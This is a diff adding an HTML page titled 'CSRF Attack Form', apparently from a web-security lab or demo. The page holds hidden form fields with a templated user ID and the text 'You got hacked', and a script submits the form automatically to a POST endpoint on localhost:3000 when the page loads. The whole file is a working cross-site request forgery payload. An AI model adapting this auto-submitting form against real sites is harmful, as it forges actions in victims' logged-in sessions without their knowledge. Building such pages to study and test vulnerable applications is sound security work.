@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF Attack Form</title>
+</head>
+<body>
+  <h1>Performing CSRF Attack...</h1>
+  <form id="csrfForm" action="http://localhost:3000/post" method="POST">
+    <input type="hidden" name="user_id" value="<%= userId %>"> <!-- Replace with actual user ID -->
+    <input type="hidden" name="content" value="You got hacked">
+    <button type="submit">Submit</button>
+  </form>
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
